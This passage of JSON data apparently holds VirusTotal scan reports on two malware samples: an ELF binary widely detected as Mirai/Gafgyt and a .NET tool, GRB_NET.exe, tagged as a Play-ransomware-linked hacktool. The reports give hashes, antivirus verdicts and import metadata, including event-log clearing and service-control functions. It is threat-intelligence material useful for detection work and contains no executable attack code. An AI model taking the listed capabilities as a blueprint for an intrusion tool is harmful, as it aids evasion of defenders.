          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Suspicious.Linux.Save.a",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.134.50630",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.134.50632",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.610",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28513",
          "result": "a variant of Linux/Mirai.CII",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.486",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Backdoor.Linux.BASHLITE.SMJC",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "ELF:Mirai-CCH [Trj]",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Unix.Trojan.Mirai-10010074-0",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Backdoor.Linux.Mirai.gen",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.Linux.GenericKD.20036",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Elf32.Mirai.kcfpxn",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.Linux.GenericKD.20036",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Backdoor.Mirai/Linux!8.13285 (CLOUD)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.Linux.GenericKD.20036 (B)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Malware.ANDROID/AVE.Mirai.udtuu",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Linux.Siggen.9999",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.Linux.GenericKD.20036",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Backdoor.Linux.BASHLITE.SMJC",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Linux.Mirai",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37105B:27.34444",
          "result": "Linux.Trojan.Gafgyt.B",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "E32/Mirai.BEH",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "ANDROID/AVE.Mirai.udtuu",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=88)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Linux.Mirai.cii",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Linux.Backdoor.Mirai.gen",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:Linux/Multiverze",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.153.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36316",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Linux.Generic.D4E44",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Backdoor.Linux.Mirai.gen",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Avast-Mobile": {
          "category": "malicious",
          "engine_name": "Avast-Mobile",
          "engine_version": "240104-00",
          "result": "ELF:Mirai-CCI [Trj]",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1704366023",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Backdoor/Linux.Agent.128784",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "BitDefenderTheta": {
          "category": "malicious",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": "Gen:NN.Mirai.36680",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-04.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Linux.Backdoor.Mirai.Uwhl",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": "Static AI - Malicious ELF",
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.121218.susgen",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "Linux/Mirai.REAL!tr",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "ELF:Mirai-CCH [Trj]",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "ELF/TrojanGen.A",
          "method": "blacklist",
          "engine_update": "20240103"
        }
      },
      "trid": [
        {
          "file_type": "ELF Executable and Linkable format (Linux)",
          "probability": 50.1
        },
        {
          "file_type": "ELF Executable and Linkable format (generic)",
          "probability": 49.8
        }
      ],
      "sandbox_verdicts": {
        "Zenbox Linux": {
          "category": "malicious",
          "confidence": 56,
          "sandbox_name": "Zenbox Linux",
          "malware_classification": [
            "MALWARE",
            "TROJAN"
          ],
          "malware_names": [
            "Mirai"
          ]
        }
      },
      "sha256": "5466d9405031060ffb564f14b5a263eda12e179287ca4a4a7c94501cd6a25c53",
      "tags": [
        "elf"
      ],
      "last_analysis_date": 1704368682,
      "unique_sources": 5,
      "first_submission_date": 1697158827,
      "ssdeep": "3072:EJ5aQiDY/SvQSyJ14q7rRQxOsBqu9lRTOFkP12FF986:EJ5anY/SvdyoqRMhBDRTOFD",
      "md5": "91c36bd124e4c8f7a2bc6b6d01324d3c",
      "sha1": "c7ae2abe4870bb274c1420beab092edb276dde78",
      "magic": "ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 11,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 41,
        "undetected": 19
      },
      "meaningful_name": "unknown",
      "reputation": 0
    },
    "type": "file",
    "id": "5466d9405031060ffb564f14b5a263eda12e179287ca4a4a7c94501cd6a25c53",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/5466d9405031060ffb564f14b5a263eda12e179287ca4a4a7c94501cd6a25c53"
    }
  }
},
{
  "_id": {
    "$oid": "6596a67206bafd61c48fcc5f"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T109F3BED5B3AC2E59CA6D0E7D9351124B47B3C6172902DBDF9FACB1F12C463C19A0A4B2",
      "vhash": "215036751511d0b327720f0",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "creation_date": 1663530507,
      "names": [
        "GRB_NET.exe",
        "453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb.bin.sample"
      ],
      "signature_info": {
        "product": "GRB_NET",
        "internal name": "GRB_NET.exe",
        "file version": "1.0.0.0",
        "original name": "GRB_NET.exe",
        "copyright": "Copyright ©  2022",
        "description": "GRB_NET"
      },
      "last_modification_date": 1704055746,
      "type_tag": "peexe",
      "times_submitted": 6,
      "total_votes": {
        "harmless": 0,
        "malicious": 2
      },
      "size": 167936,
      "popular_threat_classification": {
        "suggested_threat_label": "hacktool.grbnet/play",
        "popular_threat_category": [
          {
            "count": 18,
            "value": "hacktool"
          },
          {
            "count": 5,
            "value": "ransomware"
          },
          {
            "count": 5,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 6,
            "value": "grbnet"
          },
          {
            "count": 5,
            "value": "play"
          },
          {
            "count": 4,
            "value": "msil"
          }
        ]
      },
      "authentihash": "72b163185bbc2157215162eb547487146e6f133482d8e55cff2952ffaf935c8b",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "v4.0.30319",
            "type": "Library",
            "name": ".NET"
          },
          {
            "type": "Library",
            "name": "Costura.Fody"
          },
          {
            "version": "v4.0.30319",
            "type": "Library",
            "name": ".NET"
          },
          {
            "version": "11.0",
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "last_submission_date": 1690324527,
      "meaningful_name": "GRB_NET.exe",
      "trid": [
        {
          "file_type": "Generic CIL Executable (.NET, Mono, etc.)",
          "probability": 67.7
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 9.7
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 6
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 4.6
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 4.1
        }
      ],
      "sandbox_verdicts": {
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "assembly",
        "runtime-modules",
        "detect-debug-environment",
        "long-sleeps",
        "direct-cpu-clock-access",
        "checks-user-input"
      ],
      "last_analysis_date": 1703683463,
      "unique_sources": 5,
      "first_submission_date": 1669295225,
      "sha1": "6e8582faeaf34f63fbe0083a811bcce1aa6c31de",
      "ssdeep": "3072:1P5s39zIYe+8UGXD5jXROpSwm53Ag1MO/SsbdE9Z/G9rchZeWsFweKZ/Ic:fyIYe+8UsDt8pSwmnMO/Ssbie9c02eT",
      "packers": {
        "PEiD": ".NET executable"
      },
      "md5": "09f341874f72a5cfcedbca707bfd1b3b",
      "dot_net_assembly": {
        "strongname_va": 0,
        "external_assemblies": {
          "System.Data": {
            "version": "4.0.0.0"
          },
          "System.DirectoryServices.AccountManagement": {
            "version": "4.0.0.0"
          },
          "CommandLine": {
            "version": "2.9.1.0"
          },
          "System": {
            "version": "4.0.0.0"
          },
          "mscorlib": {
            "version": "4.0.0.0"
          },
          "System.IO.Compression": {
            "version": "4.0.0.0"
          },
          "System.DirectoryServices": {
            "version": "4.0.0.0"
          },
          "System.Core": {
            "version": "4.0.0.0"
          },
          "System.Management": {
            "version": "4.0.0.0"
          },
          "System.Numerics": {
            "version": "4.0.0.0"
          }
        },
        "tables_rows_map": "1ad420103019701361a1973f11b60004a000120589a2443ff000100a00002260220",
        "tables_present_map": "b091fa23f57",
        "manifest_resource": [
          "costura.commandline.dll.compressed",
          "costura.costura.dll.compressed"
        ],
        "tables_rows_map_log": "4989a97a8958789758646477",
        "type_definition_list": [
          {
            "type_definitions": [
              "Object",
              "IEquatable`1",
              "ValueType",
              "IComparable",
              "Enum",
              "IDisposable",
              "Action`1",
              "Console",
              "Int32",
              "String",
              "Func`2",
              "Boolean",
              "UInt32",
              "Action",
              "Exception",
              "AppDomain",
              "UnhandledExceptionEventArgs",
              "UnhandledExceptionEventHandler",
              "Environment",
              "Char",
              "Byte",
              "Int16",
              "Int64",
              "Convert",
              "BitConverter",
              "Func`3",
              "Predicate`1",
              "Array",
              "ObsoleteAttribute",
              "ArgumentNullException",
              "ArgumentException",
              "Nullable`1",
              "OverflowException",
              "IntPtr",
              "FormatException",
              "Type",
              "IAsyncResult",
              "AsyncCallback",
              "Func`1",
              "Math",
              "Double",
              "UInt64",
              "RuntimeTypeHandle",
              "ParamArrayAttribute",
              "NotSupportedException",
              "InvalidOperationException",
              "StringComparison",
              "ResolveEventArgs",
              "ResolveEventHandler"
            ],
            "namespace": "System"
          },
          {
            "type_definitions": [
              "ComVisibleAttribute",
              "GuidAttribute",
              "SafeHandle",
              "Marshal"
            ],
            "namespace": "System.Runtime.InteropServices"
          },
          {
            "type_definitions": [
              "RegistryKey",
              "RegistryHive",
              "RegistryView"
            ],
            "namespace": "Microsoft.Win32"
          },
          {
            "type_definitions": [
              "ClaimsIdentity"
            ],
            "namespace": "System.Security.Claims"
          },
          {
            "type_definitions": [
              "AssemblyTitleAttribute",
              "AssemblyDescriptionAttribute",
              "AssemblyConfigurationAttribute",
              "AssemblyCompanyAttribute",
              "AssemblyProductAttribute",
              "AssemblyCopyrightAttribute",
              "AssemblyTrademarkAttribute",
              "AssemblyFileVersionAttribute",
              "Assembly",
              "AssemblyName",
              "AssemblyNameFlags"
            ],
            "namespace": "System.Reflection"
          },
          {
            "type_definitions": [
              "PrincipalContext",
              "PrincipalSearcher",
              "Principal",
              "ContextType",
              "UserPrincipal",
              "PrincipalSearchResult`1",
              "ComputerPrincipal"
            ],
            "namespace": "System.DirectoryServices.AccountManagement"
          },
          {
            "type_definitions": [
              "Enumerable"
            ],
            "namespace": "System.Linq"
          },
          {
            "type_definitions": [
              "Regex",
              "Match",
              "Group",
              "GroupCollection",
              "Capture",
              "RegexOptions"
            ],
            "namespace": "System.Text.RegularExpressions"
          },
          {
            "type_definitions": [
              "ZipArchive",
              "ZipArchiveMode",
              "ZipArchiveEntry",
              "CompressionLevel",
              "DeflateStream",
              "CompressionMode"
            ],
            "namespace": "System.IO.Compression"
          },
          {
            "type_definitions": [
              "Ping",
              "PingOptions",
              "PingReply",
              "IPStatus"
            ],
            "namespace": "System.Net.NetworkInformation"
          },
          {
            "type_definitions": [
              "ManagementPath",
              "ConnectionOptions",
              "ManagementException",
              "ImpersonationLevel",
              "ManagementScope",
              "SelectQuery",
              "ManagementObjectSearcher",
              "ManagementObjectCollection",
              "ManagementObject",
              "ObjectQuery",
              "ManagementBaseObject",
              "PropertyDataCollection",
              "PropertyData"
            ],
            "namespace": "System.Management"
          },
          {
            "type_definitions": [
              "Task",
              "ParallelOptions",
              "ParallelLoopResult",
              "Parallel",
              "Task`1"
            ],
            "namespace": "System.Threading.Tasks"
          },
          {
            "type_definitions": [
              "DataTable",
              "DataRowCollection",
              "DataRow",
              "InternalDataCollectionBase",
              "DataColumn",
              "DataColumnCollection"
            ],
            "namespace": "System.Data"
          },
          {
            "type_definitions": [
              "StringBuilder"
            ],
            "namespace": "System.Text"
          },
          {
            "type_definitions": [
              "OptionAttribute",
              "ParserResult`1",
              "Parser",
              "ParserResultExtensions"
            ],
            "namespace": "CommandLine"
          },
          {
            "type_definitions": [
              "ExtensionAttribute",
              "CompilationRelaxationsAttribute",
              "RuntimeCompatibilityAttribute",
              "SuppressIldasmAttribute",
              "CompilerGeneratedAttribute",
              "IteratorStateMachineAttribute"
            ],
            "namespace": "System.Runtime.CompilerServices"
          },
          {
            "type_definitions": [
              "WaitHandle",
              "Monitor",
              "Interlocked"
            ],
            "namespace": "System.Threading"
          },
          {
            "type_definitions": [
              "TargetFrameworkAttribute"
            ],
            "namespace": "System.Runtime.Versioning"
          },
          {
            "type_definitions": [
              "SecureString",
              "SecurityCriticalAttribute",
              "SecurityCriticalScope"
            ],
            "namespace": "System.Security"
          },
          {
            "type_definitions": [
              "DirectoryEntry",
              "PropertyCollection",
              "PropertyValueCollection"
            ],
            "namespace": "System.DirectoryServices"
          },
          {
            "type_definitions": [
              "IPAddress",
              "IPHostEntry",
              "Dns"
            ],
            "namespace": "System.Net"
          },
          {
            "type_definitions": [
              "CultureInfo"
            ],
            "namespace": "System.Globalization"
          },
          {
            "type_definitions": [
              "AddressFamily"
            ],
            "namespace": "System.Net.Sockets"
          },
          {
            "type_definitions": [
              "ConcurrentDictionary`2",
              "ConcurrentBag`1"
            ],
            "namespace": "System.Collections.Concurrent"
          },
          {
            "type_definitions": [
              "DebuggerHiddenAttribute"
            ],
            "namespace": "System.Diagnostics"
          },
          {
            "type_definitions": [
              "IEnumerable",
              "IEnumerator"
            ],
            "namespace": "System.Collections"
          },
          {
            "type_definitions": [
              "File",
              "MemoryStream",
              "Stream",
              "StreamWriter",
              "TextWriter",
              "FileStream",
              "FileMode",
              "SeekOrigin"
            ],
            "namespace": "System.IO"
          },
          {
            "type_definitions": [
              "WindowsIdentity"
            ],
            "namespace": "System.Security.Principal"
          },
          {
            "type_definitions": [
              "EditorBrowsableAttribute",
              "EditorBrowsableState",
              "Win32Exception"
            ],
            "namespace": "System.ComponentModel"
          },
          {
            "type_definitions": [
              "Enumerator",
              "Enumerator",
              "ManagementObjectEnumerator"
            ],
            "namespace": "uncategorized"
          },
          {
            "type_definitions": [
              "BigInteger"
            ],
            "namespace": "System.Numerics"
          },
          {
            "type_definitions": [
              "IEnumerable`1",
              "IReadOnlyDictionary`2",
              "IReadOnlyCollection`1",
              "KeyValuePair`2",
              "ICollection`1",
              "IEnumerator`1",
              "List`1",
              "Dictionary`2",
              "EqualityComparer`1",
              "KeyNotFoundException"
            ],
            "namespace": "System.Collections.Generic"
          }
        ],
        "unmanaged_method_list": [
          {
            "name": "advapi32.dll",
            "methods": [
              "OpenSCManagerW",
              "OpenService",
              "QueryServiceConfig",
              "QueryServiceStatusEx",
              "ChangeServiceConfig",
              "StartService",
              "CloseServiceHandle"
            ]
          },
          {
            "name": "kernel32.dll",
            "methods": [
              "FormatMessage"
            ]
          },
          {
            "name": "wevtapi.dll",
            "methods": [
              "EvtOpenSession"
            ]
          },
          {
            "name": "Wevtapi.dll",
            "methods": [
              "EvtOpenChannelConfig",
              "EvtGetChannelConfigProperty",
              "EvtOpenLog",
              "EvtGetLogInfo",
              "EvtClose",
              "EvtClearLog"
            ]
          }
        ],
        "metadata_header_rva": 38040,
        "external_modules": [
          "advapi32.dll",
          "Wevtapi.dll",
          "wevtapi.dll",
          "kernel32.dll"
        ],
        "assembly_flags": 3,
        "assembly_flags_txt": "COMIMAGE_FLAGS_ILONLY, COMIMAGE_FLAGS_32BITREQUIRED",
        "entry_point_token": 100663299,
        "entry_point_rva": 79492,
        "assembly_name": "GRB_NET.exe",
        "resources_va": 93615,
        "assembly_data": {
          "majorversion": 1,
          "minorversion": 0,
          "hashalgid": 32772,
          "flags_text": "afPA_None",
          "buildnumber": 0,
          "flags": 0,
          "revisionnumber": 0,
          "name": "GRB_NET"
        },
        "streams": {
          "#~": {
            "chi2": 517210.53125,
            "size": 18536,
            "entropy": 5.483018398284912,
            "md5": "ff487026cffb8c23c8557f8650756c46"
          },
          "#Strings": {
            "chi2": 63579.046875,
            "size": 5820,
            "entropy": 4.976484775543213,
            "md5": "0eb41cca3c83ff21b51f3fa92ca0c1d4"
          },
          "#US": {
            "chi2": 13151.873046875,
            "size": 10632,
            "entropy": 7.234265327453613,
            "md5": "3c3d5729b9f7a38abf7979b95456b93a"
          },
          "#GUID": {
            "chi2": 240,
            "size": 16,
            "entropy": 4,
            "md5": "0aff1c75cba63eafdeb1d9026fed94dd"
          },
          "#Blob": {
            "chi2": 49636.4296875,
            "size": 6340,
            "entropy": 5.6723198890686035,
            "md5": "37a405bf3ae3072f065f025b8efbe180"
          }
        },
        "tables_present": 24,
        "clr_version": "v4.0.30319",
        "unmanaged_methods": {
          "advapi32.dll": [
            "OpenSCManagerW",
            "OpenService",
            "QueryServiceConfig",
            "QueryServiceStatusEx",
            "ChangeServiceConfig",
            "StartService",
            "CloseServiceHandle"
          ],
          "kernel32.dll": [
            "FormatMessage"
          ],
          "Wevtapi.dll": [
            "EvtOpenChannelConfig",
            "EvtGetChannelConfigProperty",
            "EvtOpenLog",
            "EvtGetLogInfo",
            "EvtClose",
            "EvtClearLog"
          ],
          "wevtapi.dll": [
            "EvtOpenSession"
          ]
        },
        "clr_meta_version": "1.1"
      },
      "pe_info": {
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "entropy": 3.30332088470459,
            "chi2": 65648.06,
            "filetype": "unknown",
            "sha256": "ad285c9cab9132f8c964e8427c81966e680add33874601d938051b9f77594257",
            "type": "RT_VERSION"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.00111722946167,
            "chi2": 4719.86,
            "filetype": "unknown",
            "sha256": "539dc26a14b6277e87348594ab7d6e932d16aabb18612d77f29fe421a9f1d46a",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_VERSION": 1
        },
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "resource_langs": {
          "NEUTRAL": 2
        },
        "machine_type": 332,
        "timestamp": 1663530507,
        "entry_point": 173198,
        "sections": [
          {
            "name": ".text",
            "chi2": 444394.62,
            "virtual_address": 8192,
            "flags": "rx",
            "raw_size": 165376,
            "entropy": 7.54,
            "virtual_size": 165012,
            "md5": "d8676d273fa876b4ade28d30bdf7c7c5"
          },
          {
            "name": ".rsrc",
            "chi2": 79813.83,
            "virtual_address": 180224,
            "flags": "r",
            "raw_size": 1536,
            "entropy": 4.09,
            "virtual_size": 1440,
            "md5": "83db971a513b2017693004b1bf27bca3"
          },
          {
            "name": ".reloc",
            "chi2": 128015,
            "virtual_address": 188416,
            "flags": "r",
            "raw_size": 512,
            "entropy": 0.1,
            "virtual_size": 12,
            "md5": "ce7bab85b340518899d97dccc0af840a"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorExeMain"
            ]
          }
        ]
      },
      "magic": "PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 47,
        "undetected": 25
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W32.AIDetectMalware.CS",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Hacktool.Win32.Play.3!c",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Application.HackTool.AZM",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231226"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Artemis!Trojan",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Application.HackTool.AZM",
          "method": "blacklist",
          "engine_update": "20231227"
